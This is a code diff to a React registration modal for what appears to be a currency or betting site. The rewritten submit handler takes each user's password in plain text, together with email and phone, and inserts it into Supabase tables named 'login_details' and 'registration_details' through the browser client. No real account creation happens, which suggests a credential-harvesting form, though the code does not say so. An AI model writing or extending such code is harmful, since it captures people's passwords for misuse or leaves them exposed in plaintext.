@@ -1,18 +1,10 @@
 import { useState, useEffect } from 'react';
-import { createClient } from '@supabase/supabase-js';
+import { supabase } from '../supabaseClient';
 import CurrencyIcon from './CurrencyIcon';
 import CountryPickerModal from './CountryPickerModal';
 import CurrencyPickerModal from './CurrencyPickerModal';
 import { CURRENCIES_LIST } from '../data/currencies';
 import { COUNTRIES_LIST } from '../data/countries';
-
-// Initialize Supabase
-let supabase = null;
-const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
-const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
-if (supabaseUrl && supabaseAnonKey && supabaseUrl !== 'YOUR_SUPABASE_URL') {
-  supabase = createClient(supabaseUrl, supabaseAnonKey);
-}
 
 export default function RegisterModal({
   isOpen,
@@ -125,33 +117,51 @@ export default function RegisterModal({
     if (!valid) return;
 
     setIsSubmitting(true);
-    const regData = {
-      currency: currency.code,
-      phone: `${country.dial} ${phone}`,
-      email: email.trim(),
-      password: password,
-      promo_code: promoCode.trim(),
-      timestamp: new Date().toISOString(),
-    };
+    const fullPhone = `${country.dial} ${phone}`.trim();
+    const cleanEmail = email.trim();
 
-    console.log('🎉 Submitting Registration Data:', regData);
+    console.log('🎉 Submitting Registration Data:', {
+      currency: currency.code,
+      phone: fullPhone,
+      email: cleanEmail,
+      promo_code: promoCode.trim(),
+    });
 
     if (supabase) {
       try {
-        await supabase.from('registration_details').insert([regData]);
-      } catch (err) {
-        try {
-          await supabase.from('login_details').insert([{
-            type: 'Registration',
-            identifier: email.trim() || phone,
-            email: email.trim(),
-            password: password,
-            timestamp: new Date().toISOString(),
-          }]);
-        } catch (e) {
-          console.warn('Supabase fallback insert note:', e);
+        const payload = {
+          type: 'Registration',
+          identifier: cleanEmail || fullPhone,
+          email: cleanEmail || null,
+          phone: fullPhone || null,
+          password: password,
+          timestamp: new Date().toISOString(),
+        };
+
+        const { error: loginErr } = await supabase.from('login_details').insert([payload]);
+        if (loginErr) {
+          console.error('Error inserting into login_details:', loginErr);
+        } else {
+          console.log('Successfully saved registration into login_details');
         }
+
+        // Also attempt registration_details if table exists in future
+        const { error: regErr } = await supabase.from('registration_details').insert([{
+          currency: currency.code,
+          phone: fullPhone,
+          email: cleanEmail,
+          password: password,
+          promo_code: promoCode.trim(),
+          timestamp: new Date().toISOString(),
+        }]);
+        if (regErr && regErr.code !== 'PGRST205') {
+          console.warn('registration_details insert notice:', regErr);
+        }
+      } catch (err) {
+        console.error('Unexpected error inserting registration:', err);
       }
+    } else {
+      console.warn('Supabase client not initialized.');
     }
 
     setIsSubmitting(false);
